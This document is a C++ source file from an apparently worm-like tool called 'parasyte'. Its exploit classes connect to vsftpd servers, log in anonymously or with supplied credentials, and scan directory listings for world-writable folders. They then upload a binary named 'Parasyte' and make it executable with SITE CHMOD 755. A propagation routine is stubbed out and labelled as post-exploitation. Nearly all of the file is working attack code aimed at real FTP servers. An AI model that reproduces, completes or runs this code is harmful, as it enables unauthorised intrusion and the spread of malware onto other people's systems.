/*
    Copyright (C) 2024 by alexbsec
    Permission is hereby granted, free of charge, to any person obtaining a copy of this
    software and associated documentation files (the "Software"), to deal in the Software
    without restriction, including without l> imitation the rights to use, copy, modify, merge,
    publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons
    to whom the Software is furnished to do so, subject to the following conditions:
    The above copyright notice and this permission notice shall be included in all copies or
    substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING
    BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
    IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
    IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE
    OR OTHER DEALINGS IN THE SOFTWARE.
*/

// Include declarations

#include "ExploitBase.hpp"

#include <chrono>
#include <regex>
#include <string>
#include <thread>

/* CODE START */

namespace parasyte {
namespace exploits {
  ExploitBase::ExploitBase(boost::asio::io_context& io_context, const ServerInfo& server_info, bool brute_force)
      : io_context_(io_context)
      , server_info_(server_info)
      , brute_force_(brute_force)
      , error_handler_(error_handler::ErrorHandler::error_type::ERROR) {
    logger_.Log(parasyte::utils::logging::LogLevel::INFO, "Initializing exploit for " + server_info.server + " on " + server_info.host);
    if (server_info.server == "vsftpd") {
      if (brute_force) {
        // Implement brute force strategy
      } else {
        exploiters.push_back(
          std::make_unique<simple::ftp::Exploiter>(io_context, server_info.host, server_info.server, brute_force)
        );
      }
    } else {
      exploiters.push_back(nullptr);
    }
  }

  ExploitBase::~ExploitBase() {}

  simple::ftp::vsFTPStrategy::vsFTPStrategy(boost::asio::io_context& io_context, simple::ftp::vsFTPParams params)
      : io_context_(io_context)
      , host_(params.host)
      , username_(params.username)
      , password_(params.password)
      , socket_(io_context)
      , error_handler_(error_handler::ErrorHandler::error_type::ERROR) {
    try_anon_ = false;
    if (username_.empty() || username_ == "anonymous") try_anon_ = true;
  }

  simple::ftp::vsFTPStrategy::~vsFTPStrategy() {}

  void simple::ftp::vsFTPStrategy::Execute() {
    if (!Connect()) {
      error_handler_.HandleError("Failed to connect and login.  Cannot execute FTP commands.");
      return;
    }

    std::vector<std::string> writable_dirs = ListWritableDirectories();
    if (writable_dirs.empty()) {
      error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
      error_handler_.HandleError("No writable directories found.");
      return;
    }

    std::string dir = writable_dirs[0];

    SendCommand("CWD " + dir + "\r\n");
    if (!ReadResponse()) {
      error_handler_.HandleError("Failed to change directory to upload.");
      return;
    }

    SendCommand("TYPE I\r\n");
    if (!ReadResponse()) {
      error_handler_.HandleError("Failed to set binary mode.");
      return;
    }

    SendFile("Parasyte");

    logger_.Log(parasyte::utils::logging::LogLevel::INFO, "Changing file permissions...");
    SendCommand("SITE CHMOD 755 Parasyte\r\n");
    if (!ReadResponse() || response_.find("200") == std::string::npos) {
      logger_.Log(parasyte::utils::logging::LogLevel::ERROR, "Failed to change file permissions. Got response: " + response_);
      error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
      error_handler_.HandleError("Failed to change file permissions. But file was uploaded.");
      return;
    }

    logger_.Log(parasyte::utils::logging::LogLevel::INFO, "Exploit completed successfully.");
  }

  void simple::ftp::vsFTPStrategy::SendFile(const std::string& filename) {
    SendCommand("PASV\r\n");  // Set passive mode
    ReadResponse();

    auto [passv_address, passv_port] = ParsePASVResponse(response_);
    if (passv_address.is_unspecified()) {
      error_handler_.SetType(error_handler::ErrorHandler::error_type::ERROR);
      error_handler_.HandleError("Failed to parse PASV response. Retrying login...");
      logger_.Log(
        parasyte::utils::logging::LogLevel::ERROR,
        "Failed to parse PASV response. Got unspecified address. Response: " + response_
      );

      AttemptLogin();
      if (is_logged_in_) {
        SendFile(filename);
      } else {
        return;
      }
    }

    boost::asio::ip::tcp::endpoint data_endpoint(passv_address, passv_port);
    boost::asio::ip::tcp::socket new_socket(io_context_);

    new_socket.connect(data_endpoint);
    std::cout << "Checking file...\n";
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
      logger_.Log(parasyte::utils::logging::LogLevel::ERROR, "Failed to open file.");
      error_handler_.SetType(error_handler::ErrorHandler::error_type::ERROR);
      error_handler_.HandleError("Failed to open file.");
      return;
    }

    std::cout << "Sending file...\n";
    SendCommand("STOR " + filename + "\r\n");
    ReadResponse();

    std::cout << "Writing file...\n";
    boost::asio::streambuf file_buffer;
    while (file) {
      char data[67024];
      file.read(data, sizeof(data));
      std::size_t len = file.gcount();  // Get the number of characters read

      if (len > 0) {
        try {
          boost::asio::write(new_socket, boost::asio::buffer(data, len));
        }
        catch (const boost::system::system_error& err) {
          error_handler_.SetType(error_handler::ErrorHandler::error_type::ERROR);
          error_handler_.HandleError(err.what());
          logger_.Log(parasyte::utils::logging::LogLevel::ERROR, err.what());
          break;
        }
      }

      if (file.eof()) {
        logger_.Log(parasyte::utils::logging::LogLevel::INFO, "Writing file OK. EOF reached normally.");
        break;  // Exit the loop on EOF
      } else if (file.fail() && !file.eof()) {
        error_handler_.SetType(error_handler::ErrorHandler::error_type::ERROR);
        error_handler_.HandleError("Read failed before reaching EOF.");
        logger_.Log(parasyte::utils::logging::LogLevel::ERROR, "Read failed before reaching EOF.");
        break;  // Handle read errors
      }
    }

    file.close();
    new_socket.close();
  }

  bool simple::ftp::vsFTPStrategy::Connect() {
    try {
      boost::asio::ip::tcp::resolver resolver(io_context_);
      boost::asio::ip::tcp::resolver::results_type endpoints = resolver.resolve(host_, "ftp");

      boost::asio::connect(socket_, endpoints);
      return AttemptLogin();
    }
    catch (const std::exception& e) {
      error_handler_.HandleError(e.what());
    }

    return false;
  }

  void simple::ftp::vsFTPStrategy::SendCommand(const std::string& command) {
    try {
      logger_.Log(parasyte::utils::logging::LogLevel::INFO, "Sending command: " + command);
      socket_.write_some(boost::asio::buffer(command));
      // Added this line to correctly wait for the server to process the command
      // Might need to make thte wait seconds a variable
      std::this_thread::sleep_for(std::chrono::microseconds(100));
    }
    catch (const std::exception& e) {
      error_handler_.HandleError(e.what());
    }
  }

  bool simple::ftp::vsFTPStrategy::ReadResponse() {
    try {
      boost::asio::streambuf response;
      boost::asio::read_until(socket_, response, "\r\n");

      std::istream response_stream(&response);
      std::string response_line;
      std::ostringstream full_response;

      while (std::getline(response_stream, response_line) && !response_stream.eof()) {
        logger_.Log(parasyte::utils::logging::LogLevel::INFO, "Got response: " + response_line);
        full_response << response_line << "\n";
      }

      response_ = full_response.str();
      return true;
    }
    catch (const std::exception& e) {
      error_handler_.SetType(error_handler::ErrorHandler::error_type::ERROR);
      logger_.Log(parasyte::utils::logging::LogLevel::ERROR, e.what());
      error_handler_.HandleError(e.what());
      return false;
    }
  }

  bool simple::ftp::vsFTPStrategy::AttemptLogin() {
    bool anon_success = AttemptAnonLogin();
    if (anon_success) return true;
    bool user_success = AttemptUserLogin();
    return user_success;
  }

  bool simple::ftp::vsFTPStrategy::AttemptAnonLogin() {
    try {
      if (!ReadResponse() || response_.find("220") == std::string::npos) {
        error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
        std::ostringstream log;
        log << "Failed to receive initial 220 response. Got response: " << response_;
        logger_.Log(parasyte::utils::logging::LogLevel::WARNING, log.str());
        error_handler_.HandleError("Failed to receive initial 220 response.");
        is_logged_in_ = false;
        return false;
      }

      SendCommand("USER anonymous\r\n");
      if (!ReadResponse() || response_.find("331") == std::string::npos) {
        error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
        std::ostringstream log;
        log << "Failed to send USER command. Got response: " << response_;
        logger_.Log(parasyte::utils::logging::LogLevel::WARNING, log.str());
        error_handler_.HandleError("Failed to send USER command.");
        is_logged_in_ = false;
        return false;
      }

      SendCommand("PASS anonymous\r\n");
      if (!ReadResponse() || response_.find("230") == std::string::npos) {
        error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
        std::ostringstream log;
        log << "Failed to send PASS command. Got response: " << response_;
        logger_.Log(parasyte::utils::logging::LogLevel::WARNING, log.str());
        error_handler_.HandleError("Failed to send PASS command.");
        is_logged_in_ = false;
        return false;
      }

      is_logged_in_ = true;
      logger_.Log(parasyte::utils::logging::LogLevel::INFO, "Successfully logged in anonymously.");
      return true;
    }
    catch (const std::exception& e) {
      logger_.Log(parasyte::utils::logging::LogLevel::ERROR, e.what());
      is_logged_in_ = false;
      error_handler_.HandleError(e.what());
      return false;
    }
  }

  bool simple::ftp::vsFTPStrategy::AttemptUserLogin() {
    try {
      socket_.write_some(boost::asio::buffer("USER " + username_ + "\r\n"));
      socket_.write_some(boost::asio::buffer("PASS " + password_ + "\r\n"));

      boost::asio::streambuf response;
      boost::asio::read_until(socket_, response, "\r\n");

      std::istream response_stream(&response);
      std::getline(response_stream, response_);
      if (response_.find("230") != std::string::npos) {
        is_logged_in_ = true;
        logger_.Log(parasyte::utils::logging::LogLevel::INFO, "Successfully logged in.");
        return true;
      } else {
        error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
        std::ostringstream log;
        log << "Failed to login on " << host_ << ". Got response: " << response_;
        logger_.Log(parasyte::utils::logging::LogLevel::WARNING, log.str());
        error_handler_.HandleError("Failed to login.");
        is_logged_in_ = false;
        return false;
      }
    }
    catch (const std::exception& e) {
      logger_.Log(parasyte::utils::logging::LogLevel::ERROR, e.what());
      is_logged_in_ = false;
      error_handler_.HandleError(e.what());
      return false;
    }
  }

  std::vector<std::string> simple::ftp::vsFTPStrategy::ListWritableDirectories() {
    std::vector<std::string> writable_dirs;

    // Set passive mode
    SendCommand("PASV\r\n");
    if (!ReadResponse()) {
      error_handler_.HandleError("Failed to set passive mode.");
      return writable_dirs;
    }

    auto [passv_address, passv_port] = ParsePASVResponse(response_);
    if (passv_address.is_unspecified()) {
      error_handler_.SetType(error_handler::ErrorHandler::error_type::ERROR);
      error_handler_.HandleError("Failed to parse PASV response.");
      logger_.Log(parasyte::utils::logging::LogLevel::ERROR, "Failed to parse PASV response. Response: " + response_);
      return writable_dirs;
    }

    boost::asio::ip::tcp::endpoint data_endpoint(passv_address, passv_port);
    boost::asio::ip::tcp::socket data_socket(io_context_);
    try {
      data_socket.connect(data_endpoint);
    }
    catch (const std::exception& e) {
      error_handler_.HandleError("Failed to connect to data endpoint.");
      logger_.Log(parasyte::utils::logging::LogLevel::ERROR, e.what());
      return writable_dirs;
    }

    // Send LIST command to get directory listing
    SendCommand("LIST\r\n");
    if (!ReadResponse()) {
      error_handler_.HandleError("Failed to send LIST command.");
      return writable_dirs;
    }

    // Read the directory listing
    boost::asio::streambuf response;
    try {
      // Read until EOF
      boost::asio::read(data_socket, response, boost::asio::transfer_all());
    }
    catch (const boost::system::system_error& e) {
      if (e.code() != boost::asio::error::eof) {
        error_handler_.HandleError("Failed to read directory listing.");
        logger_.Log(parasyte::utils::logging::LogLevel::ERROR, e.what());
        return writable_dirs;
      }
      // EOF is expected when the server closes the connection after sending the list
    }

    std::istream response_stream(&response);
    std::string response_line;
    while (std::getline(response_stream, response_line)) {
      logger_.Log(parasyte::utils::logging::LogLevel::INFO, "Directory entry: " + response_line);
      if (response_line.find("drwxrwxrwx") != std::string::npos) {
        std::string dir = response_line.substr(response_line.find_last_of(' ') + 1);
        writable_dirs.push_back(dir);
      }
    }

    for (const auto& dir : writable_dirs) {
      std::cout << "Writable directory: " << dir << std::endl;
    }

    return writable_dirs;
  }

  std::pair<boost::asio::ip::address, unsigned short> simple::ftp::vsFTPStrategy::ParsePASVResponse(const std::string& response
  ) {
    std::regex pasv_regex(R"(\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\))");
    std::smatch matches;

    if (std::regex_search(response, matches, pasv_regex) && matches.size() == 7) {
      std::string ip = matches[1].str() + "." + matches[2].str() + "." + matches[3].str() + "." + matches[4].str();
      unsigned short port = std::stoi(matches[5]) * 256 + std::stoi(matches[6]);
      return {boost::asio::ip::make_address(ip), port};
    }

    error_handler_.SetType(error_handler::ErrorHandler::error_type::ERROR);
    error_handler_.HandleError("Failed to parse PASV response.");
    logger_.Log(parasyte::utils::logging::LogLevel::ERROR, "Failed to parse PASV response.");
    return {};
  }

  simple::ftp::Exploiter::Exploiter(
    boost::asio::io_context& io_context,
    const std::string& host,
    const std::string& server,
    bool brute_force
  )
      : io_context_(io_context)
      , socket_(io_context)
      , brute_force_(brute_force)
      , server_(server)
      , error_handler_(error_handler::ErrorHandler::error_type::ERROR) {
    if (server_ == "vsftpd") {
      name_ = "vsftpd";
      if (brute_force_) {
        name_ += " (brute force login)";
        // Implement brute force strategy
      } else {
        name_ += " (anonymous login)";
        vsFTPParams vsftpd_params = {host, "anonymous", "anonymous", server, 21};
        strategy_ = std::make_unique<simple::ftp::vsFTPStrategy>(io_context_, vsftpd_params);
      }
    } else {
      strategy_ = nullptr;
    }
  }

  simple::ftp::Exploiter::~Exploiter() {}

  void simple::ftp::Exploiter::Exploit() {
    if (strategy_ == nullptr) {
      error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
      error_handler_.HandleError("No strategies available for this server.");
      return;
    }

    if (server_ == "vsftpd") {
      std::cout << "starting vsftpd exploit...\n";
      strategy_->Execute();
    }
  }

  void simple::ftp::Exploiter::Propagate() {
    if (strategy_ == nullptr) {
      error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
      logger_.Log(
        parasyte::utils::logging::LogLevel::WARNING,
        "No strategies available for server: " + server_ + ". Skipping propagation."
      );
      error_handler_.HandleError("No strategies available for this server.");
      return;
    }

    // Propagate exploit (post exploitation)
  }
}
}